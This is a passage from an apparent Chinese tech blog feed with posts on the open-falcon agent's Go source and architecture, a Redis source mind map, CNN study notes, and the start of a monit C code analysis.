go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SendToTransfer</span><span class="params">(metrics []*model.MetricValue)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(metrics) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dt := Config().DefaultTags</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(dt) &gt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">var</span> buf bytes.Buffer</span><br><span class="line">default_tags_list := []<span class="keyword">string</span>&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> dt &#123;</span><br><span class="line">buf.Reset()</span><br><span class="line">buf.WriteString(k)</span><br><span class="line">buf.WriteString(<span class="string">"="</span>)</span><br><span class="line">buf.WriteString(v)</span><br><span class="line">default_tags_list = <span class="built_in">append</span>(default_tags_list, buf.String())</span><br><span class="line">&#125;</span><br><span class="line">default_tags := strings.Join(default_tags_list, <span class="string">","</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, x := <span class="keyword">range</span> metrics &#123;</span><br><span class="line">buf.Reset()</span><br><span class="line"><span class="keyword">if</span> x.Tags == <span class="string">""</span> &#123;</span><br><span class="line">metrics[i].Tags = default_tags</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">buf.WriteString(metrics[i].Tags)</span><br><span class="line">buf.WriteString(<span class="string">","</span>)</span><br><span class="line">buf.WriteString(default_tags)</span><br><span class="line">metrics[i].Tags = buf.String()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">debug := Config().Debug</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug &#123;</span><br><span class="line">log.Printf(<span class="string">"=&gt; &lt;Total=%d&gt; %v\n"</span>, <span class="built_in">len</span>(metrics), metrics[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> resp model.TransferResponse</span><br><span class="line">    <span class="comment">// 最重要的地方，发送数据</span></span><br><span class="line">SendMetrics(metrics, &amp;resp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug &#123;</span><br><span class="line">log.Println(<span class="string">"&lt;="</span>, &amp;resp)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SendMetrics</span><span class="params">(metrics []*model.MetricValue, resp *model.TransferResponse)</span></span> &#123;</span><br><span class="line">rand.Seed(time.Now().UnixNano())</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> rand.Perm(<span class="built_in">len</span>(Config().Transfer.Addrs)) &#123;</span><br><span class="line">addr := Config().Transfer.Addrs[i]</span><br><span class="line"><span class="comment">// 获取transfer的客户端</span></span><br><span class="line">c := getTransferClient(addr)</span><br><span class="line"><span class="keyword">if</span> c == <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="comment">//没有就初始化一个</span></span><br><span class="line">c = initTransferClient(addr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//抓取数据</span></span><br><span class="line"><span class="keyword">if</span> updateMetrics(c, metrics, resp) &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用transfer模块的rpc接口update来更新数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">updateMetrics</span><span class="params">(c *SingleConnRpcClient, metrics []*model.MetricValue, resp *model.TransferResponse)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">err := c.Call(<span class="string">"Transfer.Update"</span>, metrics, resp)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"call Transfer.Update fail:"</span>, c, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后启动http服务，启动服务之前需要初始化init函数:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">configAdminRoutes()  <span class="comment">// 初始化admin接口路由</span></span><br><span class="line">configCpuRoutes()    <span class="comment">// 初始化cpu接口路由</span></span><br><span class="line">configDfRoutes()     <span class="comment">// 初始化磁盘接口路由</span></span><br><span class="line">configHealthRoutes()   <span class="comment">// 初始化健康度路由</span></span><br><span class="line">configIoStatRoutes()   <span class="comment">//初始化io</span></span><br><span class="line">configKernelRoutes()   <span class="comment">//初始化内核</span></span><br><span class="line">configMemoryRoutes()   <span class="comment">//初始化memory</span></span><br><span class="line">configPageRoutes()    <span class="comment">//初始化page</span></span><br><span class="line">configPluginRoutes()   <span class="comment">//初始化插件</span></span><br><span class="line">configPushRoutes()     <span class="comment">//初始化push, 可以使用push接口推送数据，通过这个接口转发到transfer</span></span><br><span class="line">configRunRoutes()      <span class="comment">//初始化Run</span></span><br><span class="line">configSystemRoutes()    <span class="comment">//初始化系统</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动http服务Start函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !g.Config().Http.Enabled &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addr := g.Config().Http.Listen</span><br><span class="line"><span class="keyword">if</span> addr == <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s := &amp;http.Server&#123;</span><br><span class="line">Addr:           addr,</span><br><span class="line">MaxHeaderBytes: <span class="number">1</span> &lt;&lt; <span class="number">30</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Println(<span class="string">"listening"</span>, addr)</span><br><span class="line">log.Fatalln(s.ListenAndServe())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补充一点：这些接口都是开放的api，dashboard中请求的数据接口是自己实现从数据库中查询的。dashboard中接口时基于django编写了接口，然后用js来查询这些接口数据。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-agent源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-agent源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon agent源码分析&quot;&gt;&lt;/a&gt;open-falcon agent源码分析&lt;/
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>redis 源码思维导图</title>
    <link href="http://www.mydreamdll.xyz/2020/01/20/redis%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    <id>http://www.mydreamdll.xyz/2020/01/20/redis%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</id>
    <published>2020-01-20T08:26:04.730Z</published>
    <updated>2020-01-20T08:23:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="redis-源码思维导图"><a href="#redis-源码思维导图" class="headerlink" title="redis 源码思维导图"></a>redis 源码思维导图</h2><p>本人画的redis源码思维导图，有点乱，自己凑合着看看吧~~ orz..</p><p><img src="/images/redis-server.png" alt="redis-server"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;redis-源码思维导图&quot;&gt;&lt;a href=&quot;#redis-源码思维导图&quot; class=&quot;headerlink&quot; title=&quot;redis 源码思维导图&quot;&gt;&lt;/a&gt;redis 源码思维导图&lt;/h2&gt;&lt;p&gt;本人画的redis源码思维导图，有点乱，自己凑合着看看吧~~
      
    
    </summary>
    
    
      <category term="redis" scheme="http://www.mydreamdll.xyz/categories/redis/"/>
    
    
      <category term="redis" scheme="http://www.mydreamdll.xyz/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon 架构</title>
    <link href="http://www.mydreamdll.xyz/2020/01/20/open-falcon%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.mydreamdll.xyz/2020/01/20/open-falcon%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-01-20T02:43:59.701Z</published>
    <updated>2020-01-20T02:43:59.701Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-架构"><a href="#open-falcon-架构" class="headerlink" title="open-falcon 架构"></a>open-falcon 架构</h2><p>open-falcon 主要架构图：</p><p><img src="/images/func_intro_1.png" alt="open-falcon architecture"></p><p>各个模块说明：</p><p>agent 组件：</p><p>目前 agent 服务已经覆盖公司大部分机器，一个自动采集机器指标的自动化服务。</p><p>数据上报支持三种方式: </p><ol><li><p>agent 自采集基础监控上报；</p></li><li><p>用户自定义推送数据 (数据按照指定格式推送到本地 agent 端口)；</p></li><li><p>插件采集上报。</p></li></ol><p>hbs 组件：</p><p>心跳服务器，定时从 DB 获取节点与主机对应关系、插件与节点绑定列表、模板、策略、全局策略等信息；将插件与节点绑定关系解析为插件与主机一一对应关系，并提供 rpc 接口方便所有 agent 查询；将 agent 上报的版本信息、插件信息写入 falcon 数据库；将模板、策略解析为策略与主机的关系对应表，与全局策略一起，以 rpc 方式提供给 judge 服务，方便其定时获取。</p><p>transfer 组件：</p><p>启动时维护两个一致性哈希列表，分别对应 graph 服务与 judge 服务，用于通过 endpoint 和 counter 计算得到的 MD5，定位每条监控数据应该存储到哪个 graph 实例和 judge 实例；提供数据转发功能，将 agent 通过 rpc 上报的监控数据，通过一致性哈希定位后，上报给相应的 graph 实例和 judge 实例；使用 rpc 接口提供 history 监控数据查询功能，用于绘图展示等。</p><p>graph 组件：</p><p>接入 rrdtool，用于监控数据持久化，通过 endpoint 和 counter 计算的 MD5 确定文件名；提供 rpc 接口，接收 transfer 上报的监控数据，并支持缓存，每个监控数据缓存半小时后再做数据持久化以减轻磁盘 IO 压力，提高整体吞吐量；提供索引缓存，每一个监控数据上报后，通过 endpoint、counter、step、timestamp 构建缓存，如果已存在则更新 timestamp，否则新建并上报至 graph 数据库；提供历史监控数据查询的 rpc 接口，便于 transfer 调用查询，查询时先通过索引缓存确认相应的 endpoint、counter 是否存在，如果存在则查询合并 rrd 文件中持久化数据与缓存数据并返回，否则直接返回。</p><p>judge 组件：</p><p>定时从 hbs 服务获取主机与策略的一一对应关系、以及全局策略，统称告警策略，用于告警判别；提供 rpc 接口，用于接收 transfer 上报的监控数据，收到每条数据时，遍历所有告警策略，如果符合告警条件，则将告警策略和监控数据存储到 redis 队列。</p><p>alarm 组件：</p><p>不停遍历 redis 队列，从中取出 judge 存储的告警策略和监控数据，写入报警数据库，然后依照告警策略中配置的告警组和获取告警成员的联系方式，和告警形成一一对应的关系，上报给 redis，方便 alarm 的下游服务进行告警发送。</p><p>aggregator 组件：</p><p>集群监控的本质是一个聚合功能。单台机器的监控指标难以反应整个集群的情况，我们需要把整个集群的机器（体现为 xbox 某个节点下的机器）综合起来看。比如所有机器的 qps 加和才是整个集群的 qps，所有机器的 request_fail 数量 ÷ 所有机器的 request_total 数量 = 整个集群的请求失败率。我们计算出集群的某个整体指标之后，也会有 “查看该指标的历史趋势图” “为该指标配置报警” 这种需求，故而，我们会把这个指标重新 push 回监控 server 端，于是，你就可以把她当成一个普通 counter 来对待了。</p><p>nodata 组件：</p><p>nodata 能够和 judge 一起，监测采集项的上报异常，过程为: 配置了 nodata 的采集项超时未上报数据，nodata 生成一条非法的 mock 数据；用户在 judge 上配置相应的报警策略，收到 mock 数据就产生报警。采集项上报异常检测，作为 judge 的一个必要补充，能够使 judge 的实时报警功能更加完善、可靠。nodata 只为少数重要的采集项服务，其处理的采集项的数量，应该不多于 judge 的十分之一。滥用 nodata，将会给 falcon 的运维管理带来很多问题。通常 nodata 按照 step 从绘图中取不到打点数据时候，当然是有一定的容错 step，一般我们控制在 2 到 3 个 step。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-架构&quot;&gt;&lt;a href=&quot;#open-falcon-架构&quot; class=&quot;headerlink&quot; title=&quot;open-falcon 架构&quot;&gt;&lt;/a&gt;open-falcon 架构&lt;/h2&gt;&lt;p&gt;open-falcon 主要架构图：&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>CNN学习笔记</title>
    <link href="http://www.mydreamdll.xyz/2020/01/19/CNN%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.mydreamdll.xyz/2020/01/19/CNN%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-01-19T12:53:29.941Z</published>
    <updated>2020-01-19T12:53:29.941Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CNN学习笔记"><a href="#CNN学习笔记" class="headerlink" title="CNN学习笔记"></a>CNN学习笔记</h2><p><strong>从神经网络到卷积神经网络（CNN）</strong></p><p><img src="/images/1093303-20170430194200912-687300437.jpg" alt="img"></p><p><strong>卷积神经网络的层级结构</strong><br>   • 数据输入层/ Input layer<br>　• 卷积计算层/ CONV layer<br>　• ReLU激励层 / ReLU layer<br>　• 池化层 / Pooling layer<br>　• 全连接层 / FC layer</p><h3 id="数据输入层"><a href="#数据输入层" class="headerlink" title="数据输入层"></a><strong>数据输入层</strong></h3><p>该层要做的处理主要是对原始图像数据进行预处理，其中包括：</p><p>去均值：把输入数据各个维度都中心化为0，如下图所示，其目的就是把样本的中心拉回到坐标系原点上。</p><p> 归一化：幅度归一化到同样的范围，如下所示，即减少各维度数据取值范围的差异而带来的干扰，比如，我们有两个维度的特征A和B，A范围是0到10，而B范围是0到10000，如果直接使用这两个特征是有问题的，好的做法就是归一化，即A和B的数据都变为0到1的范围。</p><p>PCA/白化：用PCA降维；白化是对数据各个特征轴上的幅度归一化</p><p>去均值与归一化效果图：</p><p><img src="/images/1093303-20170430194338194-1949897491.jpg" alt="img"></p><p>去相关与白化效果图：</p><p><img src="/images/1093303-20170430194357553-1200745791.jpg" alt="img"></p><h3 id="卷积计算层"><a href="#卷积计算层" class="headerlink" title="卷积计算层"></a><strong>卷积计算层</strong></h3><p>局部关联。每个神经元看做一个滤波器(filter)</p><p>窗口(receptive field)滑动， filter对局部数据计算</p><p>深度/depth</p><p>步长/stride （窗口一次滑动的长度）</p><p>填充值/zero-padding</p><p><img src="/images/1093303-20170430194425147-845167791.png" alt="img"></p><p><img src="/images/1093303-20190120113539659-455066516.gif" alt="img"></p><p><strong>参数共享机制</strong></p><p>在卷积层中每个神经元连接数据窗的权重是固定的，每个神经元只关注一个特性。神经元就是图像处理中的滤波器，比如边缘检测专用的Sobel滤波器，即卷积层的每个滤波器都会有自己所关注一个图像特征，比如垂直边缘，水平边缘，颜色，纹理等等，这些所有神经元加起来就好比就是整张图像的特征提取器集合。</p><p>一组固定的权重和不同窗口内数据做内积: 卷积</p><h3 id="激励层"><a href="#激励层" class="headerlink" title="激励层"></a><strong>激励层</strong></h3><p>把卷积层输出结果做非线性映射。</p><p><img src="/images/1093303-20170430194934006-705271151.jpg" alt="img"></p><p>CNN采用的激励函数一般为ReLU(The Rectified Linear Unit/修正线性单元)                 </p><p>激励层的实践经验：<br>不要用sigmoid！不要用sigmoid！不要用sigmoid！<br>首先试RELU，因为快，但要小心点<br>如果2失效，请用Leaky ReLU或者Maxout<br>某些情况下tanh倒是有不错的结果，但是很少</p><h3 id="池化层"><a href="#池化层" class="headerlink" title="池化层"></a><strong>池化层</strong></h3><p>池化层夹在连续的卷积层中间， 用于压缩数据和参数的量，减小过拟合。<br>简而言之，如果输入是图像的话，那么池化层的最主要作用就是压缩图像。</p><ol><li>特征不变性，也就是我们在图像处理中经常提到的特征的尺度不变性，池化操作就是图像的resize，平时一张狗的图像被缩小了一倍我们还能认出这是一张狗的照片，这说明这张图像中仍保留着狗最重要的特征，我们一看就能判断图像中画的是一只狗，图像压缩时去掉的信息只是一些无关紧要的信息，而留下的信息则是具有尺度不变性的特征，是最能表达图像的特征。</li><li>特征降维，我们知道一幅图像含有的信息是很大的，特征也很多，但是有些信息对于我们做图像任务时没有太多用途或者有重复，我们可以把这类冗余信息去除，把最重要的特征抽取出来，这也是池化操作的一大作用。</li><li>在一定程度上防止过拟合，更方便优化。</li></ol><p><img src="/images/1093303-20170430195028600-318072954.jpg" alt="img"></p><p>池化层用的方法有Max pooling 和 average pooling，而实际用的较多的是Max pooling。</p><p>Max pooling：</p><p>对于每个2<em>2的窗口选出最大的数作为输出矩阵的相应元素的值，比如输入矩阵第一个2</em>2窗口中最大的数是6，那么输出矩阵的第一个元素就是6，如此类推。</p><h3 id="全连接层"><a href="#全连接层" class="headerlink" title="全连接层"></a><strong>全连接层</strong></h3><p><img src="/images/1093303-20170430195130772-454262568.jpg" alt="img"></p><p><strong>一般CNN结构依次为</strong><br>　　1. INPUT<br>　　2. [[CONV -&gt; RELU]<em>N -&gt; POOL?]</em>M<br>　　3. [FC -&gt; RELU]*K<br>　　4. FC</p><p><strong>卷积神经网络之优缺点</strong>：</p><p>优点：<br>共享卷积核，对高维数据处理无压力<br>无需手动选取特征，训练好权重，即得特征分类效果好<br>缺点：<br>需要调参，需要大样本量，训练最好要GPU<br>物理含义不明确</p><p><strong>总结</strong><br>卷积网络在本质上是一种输入到输出的映射，它能够学习大量的输入与输出之间的映射关系，而不需要任何输入和输出之间的精确的数学表达式，只要用已知的模式对卷积网络加以训练，网络就具有输入输出对之间的映射能力。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CNN学习笔记&quot;&gt;&lt;a href=&quot;#CNN学习笔记&quot; class=&quot;headerlink&quot; title=&quot;CNN学习笔记&quot;&gt;&lt;/a&gt;CNN学习笔记&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;从神经网络到卷积神经网络（CNN）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src
      
    
    </summary>
    
    
      <category term="深度学习" scheme="http://www.mydreamdll.xyz/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="深度学习" scheme="http://www.mydreamdll.xyz/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>monit代码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/17/monit%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.mydreamdll.xyz/2020/01/17/monit%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-01-17T08:29:00.478Z</published>
    <updated>2020-01-17T08:29:00.478Z</updated>
    
    <content type="html"><![CDATA[<h2 id="monit代码分析"><a href="#monit代码分析" class="headerlink" title="monit代码分析"></a>monit代码分析</h2><p>主要流程main函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The Prime mover</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">        Bootstrap(); <span class="comment">// Bootstrap libmonit  //初始化代码</span></span><br><span class="line">        Bootstrap_setAbortHandler(vLogAbortHandler);  <span class="comment">// Abort Monit on exceptions thrown by libmonit</span></span><br><span class="line">        Bootstrap_setErrorHandler(vLogError);</span><br><span class="line">        setlocale(LC_ALL, <span class="string">"C"</span>);</span><br><span class="line">        prog = File_basename(argv[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_OPENSSL</span></span><br><span class="line">        Ssl_start();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        init_env();</span><br><span class="line">        handle_options(argc, argv);</span><br><span class="line">        do_init();</span><br><span class="line">        do_action(argc, argv);</span><br><span class="line">        do_exit(<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Bootstrap函数：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Bootstrap:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Bootstrap</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">        Exception_init();</span><br><span class="line">        Thread_init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ssl_start函数，加载ssl协议</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Ssl_start</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> (OPENSSL_VERSION_NUMBER &lt; 0x10100000L) || defined(LIBRESSL_VERSION_NUMBER)</span></span><br><span class="line">        SSL_library_init();</span><br><span class="line">        SSL_load_error_strings();</span><br><span class="line">        <span class="keyword">int</span> locks = CRYPTO_num_locks();</span><br><span class="line">        instanceMutexTable = CALLOC(locks, <span class="keyword">sizeof</span>(Mutex_T));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; locks; i++)</span><br><span class="line">                Mutex_init(instanceMutexTable[i]);</span><br><span class="line">        CRYPTO_THREADID_set_callback(_threadID);</span><br><span class="line">        CRYPTO_set_locking_callback(_mutexLock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">if</span> (File_exist(URANDOM_DEVICE))</span><br><span class="line">                RAND_load_file(URANDOM_DEVICE, RANDOM_BYTES);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (File_exist(RANDOM_DEVICE))</span><br><span class="line">                RAND_load_file(RANDOM_DEVICE, RANDOM_BYTES);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                THROW(AssertException, <span class="string">"SSL: cannot find %s nor %s on the system"</span>, URANDOM_DEVICE, RANDOM_DEVICE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化环境：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Initialize the program environment</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @see https://bitbucket.org/tildeslash/monit/commits/cd545838378517f84bdb0989cadf461a19d8ba11</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_env</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Util_closeFds();</span><br><span class="line">        <span class="comment">// Ensure that std descriptors (0, 1 and 2) are open</span></span><br><span class="line">        <span class="keyword">int</span> devnull = <span class="built_in">open</span>(<span class="string">"/dev/null"</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (devnull == <span class="number">-1</span>) &#123;</span><br><span class="line">                THROW(AssertException, <span class="string">"Cannot open /dev/null -- %s"</span>, STRERROR);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">                <span class="keyword">if</span> (fstat(i, &amp;st) == <span class="number">-1</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (dup2(devnull, i) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="built_in">close</span>(devnull);</span><br><span class="line">                                THROW(AssertException, <span class="string">"dup2 failed -- %s"</span>, STRERROR);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">close</span>(devnull);</span><br><span class="line">        <span class="comment">// Get password struct with user info</span></span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">4096</span>];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> <span class="title">pw</span>, *<span class="title">result</span> = <span class="title">NULL</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (getpwuid_r(geteuid(), &amp;pw, buf, <span class="keyword">sizeof</span>(buf), &amp;result) != <span class="number">0</span> || ! result)</span><br><span class="line">                THROW(AssertException, <span class="string">"getpwuid_r failed -- %s"</span>, STRERROR);</span><br><span class="line">        Run.Env.<span class="built_in">home</span> = Str_dup(pw.pw_dir);</span><br><span class="line">        Run.Env.user = Str_dup(pw.pw_name);</span><br><span class="line">        <span class="comment">// Get CWD</span></span><br><span class="line">        <span class="keyword">char</span> t[PATH_MAX];</span><br><span class="line">        <span class="keyword">if</span> (! Dir_cwd(t, PATH_MAX))</span><br><span class="line">                THROW(AssertException, <span class="string">"Monit: Cannot 